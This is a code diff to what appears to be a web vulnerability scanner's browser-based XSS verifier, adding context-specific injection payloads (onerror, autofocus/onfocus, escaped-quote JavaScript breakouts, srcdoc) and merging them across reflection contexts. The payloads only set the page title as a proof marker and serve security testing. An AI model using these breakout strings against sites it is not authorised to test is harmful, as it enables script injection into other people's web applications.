@@ -549,7 +549,14 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 	var out []string
 	switch a.Context {
 	case CtxHTMLText:
-		out = []string{clean, svg, `<details open ontoggle="top.document.title='%s'">`, `</script><script>top.document.title='%s'</script>`}
+		out = []string{
+			clean,
+			svg,
+			`<details open ontoggle="top.document.title='%s'">`,
+			`<video><source onerror="top.document.title='%s'">`,
+			`<input autofocus onfocus="top.document.title='%s'">`,
+			`</script><script>top.document.title='%s'</script>`,
+		}
 	case CtxQuotedAttr, CtxURL:
 		if a.Context == CtxURL && a.URLScheme {
 			out = append(out, `javascript:top.document.title='%s'`)
@@ -565,10 +572,26 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 	case CtxEventHandler, CtxJSString:
 		if a.JSQuote == '\'' {
 			out = []string{`';top.document.title='%s';//`, `');top.document.title='%s';//`}
+			if strings.Contains(a.Escaped, "'") && strings.Contains(a.Surviving, `\`) {
+				out = append([]string{`\';top.document.title='%s';//`}, out...)
+			}
 		} else if a.JSQuote == '`' {
 			out = []string{"`;top.document.title='%s';//", "${top.document.title='%s'}"}
+			if strings.Contains(a.Escaped, "`") && strings.Contains(a.Surviving, `\`) {
+				out = append([]string{"\\`;top.document.title='%s';//"}, out...)
+			}
 		} else {
 			out = []string{`";top.document.title='%s';//`, `);top.document.title='%s';//`}
+			if strings.Contains(a.Escaped, `"`) && strings.Contains(a.Surviving, `\`) {
+				out = append([]string{`\";top.document.title='%s';//`}, out...)
+			}
+		}
+		if a.Context == CtxEventHandler && a.Quote != 0 && strings.Contains(a.Surviving, string(a.Quote)) {
+			if a.Quote == '\'' {
+				out = append(out, singleBreak)
+			} else {
+				out = append(out, doubleBreak)
+			}
 		}
 		out = append(out, `</script><script>top.document.title='%s'</script>`)
 	case CtxJSExpr:
@@ -577,11 +600,21 @@ func xssBrowserPayloadsForAnalysis(a *ReflectionAnalysis) []string {
 		out = []string{`</style><svg onload="top.document.title='%s'">`}
 	case CtxComment:
 		out = []string{`--><svg onload="top.document.title='%s'">`}
-	case CtxRCDATA:
+	case CtxRCDATA, CtxRAWTEXT:
 		if a.CloseTag != "" {
 			out = []string{a.CloseTag + `<svg onload="top.document.title='%s'">`}
 		} else {
 			out = []string{`</textarea><svg onload="top.document.title='%s'">`, `</title><svg onload="top.document.title='%s'">`}
+		}
+	case CtxSrcDoc:
+		out = []string{
+			`&lt;svg onload=&quot;top.document.title='%s'&quot;&gt;`,
+			clean,
+		}
+		if a.Quote == '\'' {
+			out = append(out, singleBreak)
+		} else {
+			out = append(out, doubleBreak)
 		}
 	default:
 		return xssBrowserPayloads()
@@ -642,10 +675,42 @@ func (b *browserXSSConfirmer) ConfirmInsertionWithAnalysis(parent context.Contex
 // same real-browser random-title proof; adding a payload cannot weaken the XSS
 // verifier into a reflection-only detector.
 func (b *browserXSSConfirmer) ConfirmInsertionWithAnalysisAndTemplates(parent context.Context, ip insertionPoint, auth map[string]string, a *ReflectionAnalysis, custom []string) (payload string, ok bool) {
+	var analyses []ReflectionAnalysis
+	if a != nil {
+		analyses = []ReflectionAnalysis{*a}
+	}
+	return b.ConfirmInsertionWithAnalysesAndTemplates(parent, ip, auth, analyses, custom)
+}
+
+func xssBrowserTemplatesForAnalyses(analyses []ReflectionAnalysis) []string {
+	var templates []string
+	if len(analyses) == 0 {
+		templates = xssBrowserPayloads()
+	} else {
+		for i := range analyses {
+			templates = append(templates, xssBrowserPayloadsForAnalysis(&analyses[i])...)
+		}
+	}
+	seen := make(map[string]bool, len(templates))
+	deduped := templates[:0]
+	for _, template := range templates {
+		if template != "" && !seen[template] {
+			seen[template] = true
+			deduped = append(deduped, template)
+		}
+	}
+	return deduped
+}
+
+// ConfirmInsertionWithAnalysesAndTemplates builds one bounded, deduplicated
+// ladder across every distinct reflection context for the parameter. This keeps
+// the single-browser execution model intact while avoiding the old false
+// negative where the first/strongest reflection hid a second executable sink.
+func (b *browserXSSConfirmer) ConfirmInsertionWithAnalysesAndTemplates(parent context.Context, ip insertionPoint, auth map[string]string, analyses []ReflectionAnalysis, custom []string) (payload string, ok bool) {
 	if b == nil {
 		return "", false
 	}
-	templates := xssBrowserPayloadsForAnalysis(a)
+	templates := xssBrowserTemplatesForAnalyses(analyses)
 	seen := make(map[string]bool, len(templates)+len(custom))
 	for _, template := range templates {
 		seen[template] = true
@@ -925,7 +990,10 @@ func (b *browserXSSConfirmer) renderedDOMURLContains(parent context.Context, raw
 	key := "dom-source\x00" + rawURL + "\x00" + authFingerprint(headers)
 	reflected := strings.Contains(dom, canary) || len(hits) > 0
 	storeDOMReflection(key, reflected, trace)
-	return reflected
+	// DOM-XSS escalation cares about dangerous sink reach, not textContent or a
+	// harmless rendered text node. Plain visibility remains available through the
+	// parameter-reflection path.
+	return len(hits) > 0
 }
 
 // DOMSourceReflects is the source-mode preflight used by the broad DOM-XSS pass.
@@ -940,9 +1008,11 @@ func (b *browserXSSConfirmer) DOMSourceReflects(parent context.Context, pageURL,
 		if param == "" {
 			param = "rcx"
 		}
-		return b.DOMReflectsInsertion(parent, insertionPoint{URL: base, Param: param, Method: "GET", Location: "query"}, auth)
+		ip := insertionPoint{URL: base, Param: param, Method: "GET", Location: "query"}
+		return b.DOMReflectsInsertion(parent, ip, auth) && b.RuntimeTrace(ip, auth) != ""
 	case "path":
-		return b.DOMReflectsInsertion(parent, insertionPoint{URL: base, Param: "path", Method: "GET", Location: param}, auth)
+		ip := insertionPoint{URL: base, Param: "path", Method: "GET", Location: param}
+		return b.DOMReflectsInsertion(parent, ip, auth) && b.RuntimeTrace(ip, auth) != ""
 	case "hash":
 		key := "dom-source\x00" + base + "\x00hash\x00" + param + "\x00" + authFingerprint(auth)
 		if reflected, ok := cachedDOMReflection(key); ok {
